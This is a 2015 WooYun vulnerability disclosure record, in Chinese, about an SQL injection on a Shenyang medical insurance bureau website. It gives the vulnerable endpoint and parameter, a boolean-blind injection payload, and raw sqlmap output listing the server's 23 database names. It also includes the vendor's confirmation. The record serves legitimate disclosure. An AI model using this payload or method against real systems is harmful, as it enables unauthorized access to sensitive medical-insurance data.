{"id": 82521, "wybug_id": "wooyun-2015-0150819", "wybug_title": "沈阳市社会医疗保险管理局某处SQL注入", "wybug_corp": "沈阳市社会医疗保险管理局", "wybug_author": "路人甲", "wybug_date": "2015-11-02 09:24", "wybug_open_date": "2015-12-21 11:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-21：\t细节向公众公开  简要描述： 沈阳市社会医疗保险管理局某处SQL注入 详细说明：  \nhttp://**.**.**.**/data/AjaxService.aspx?method=selectzlml&pageSize=10&pageIndex=1&n=\n参数n\nsqlmap resumed the following injection point(s) from stored session:---Parameter: n (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: method=selectzlml&pageSize=10&pageIndex=1&n=%' AND 4743=4743 AND '%'='---[09:33:39] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[09:33:39] [INFO] fetching database names[09:33:39] [INFO] fetching number of databases[09:33:39] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[09:33:39] [INFO] retrieved: 23[09:33:47] [INFO] retrieved: EtiananDB[09:34:29] [INFO] retrieved: master[09:35:12] [INFO] retrieved: MessageDB[09:36:25] [INFO] retrieved: model[09:37:13] [INFO] retrieved: msdb[09:38:01] [INFO] retrieved: PingkerDB[09:39:53] [CRITICAL] unable to connect to the target URL or proxy. sqlmap is going to retry the request[09:40:07] [INFO] retrieved: sms[09:40:55] [INFO] retrieved: spyp_monsqlmap got a 302 redirect to 'http://**.**.**.**:80/data/AjaxService.aspx'. Do you want to follow? [Y/n] yitor[09:43:24] [INFO] retrieved: spyp_monitor_1[09:46:36] [INFO] retrieved: sqywDB[09:48:41] [INFO] retrieved: syautism[09:51:28] [INFO] retrieved: sysylhh[09:53:57] [INFO] retrieved: syyb[09:55:55] [INFO] retrieved: syybphone[09:59:25] [INFO] retrieved: syybpro[10:02:34] [INFO] retrieved: syybydjy[10:06:46] [INFO] retrieved: tempdb[10:10:08] [INFO] retrieved: upload[10:13:37] [INFO] retrieved: Vonda[10:16:53] [INFO] retrieved: Vonda_CheckDB[10:25:02] [INFO] retrieved: vonda_lyx[10:31:05] [INFO] retrieved: wdoa[10:34:49] [INFO] retrieved: yboaavailable databases [23]:[*] EtiananDB[*] master[*] MessageDB[*] model[*] msdb[*] PingkerDB[*] sms[*] spyp_monitor[*] spyp_monitor_1[*] sqywDB[*] syautism[*] sysylhh[*] syyb[*] syybphone[*] syybpro[*] syybydjy[*] tempdb[*] upload[*] Vonda[*] Vonda_CheckDB[*] vonda_lyx[*] wdoa[*] yboa\n   漏洞证明：  \n[10:39:46] [INFO] fetching tables for database: EtiananDB[10:39:46] [INFO] fetching number of tables for database 'EtiananDB'[10:39:46] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[10:39:46] [INFO] retrieved: 29[10:40:20] [INFO] retrieved: dbo.AboutUs[10:51:23] [INFO] retrieved: dbo.Adm\n\n[10:55:25] [INFO] fetching tables for database: MessageDB[10:55:25] [INFO] fetching number of tables for database 'MessageDB'[10:55:25] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[10:55:25] [INFO] retrieved: 24[10:55:54] [INFO] retrieved:\n跑的很慢，不深入！   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-11-06 10:58 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给辽宁分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}